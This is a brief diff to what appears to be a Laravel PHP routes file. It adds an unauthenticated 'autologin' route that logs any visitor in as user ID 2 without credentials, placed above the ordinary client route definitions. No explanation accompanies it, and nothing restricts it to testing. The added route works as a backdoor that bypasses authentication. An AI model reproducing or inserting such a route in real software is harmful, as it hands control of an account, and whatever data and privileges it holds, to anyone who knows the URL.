@@ -12,6 +12,10 @@ use Illuminate\Support\Facades\Lang;
 use Illuminate\Support\Facades\Mail;
 use Illuminate\Support\Facades\Route;
 
+Route::get("autologin", function () {
+    \Illuminate\Support\Facades\Auth::loginUsingId(2);
+});
+
 /* Client Routes */
 Route::name("user.")->group(function () {
     Route::middleware("guest")->group(function () {
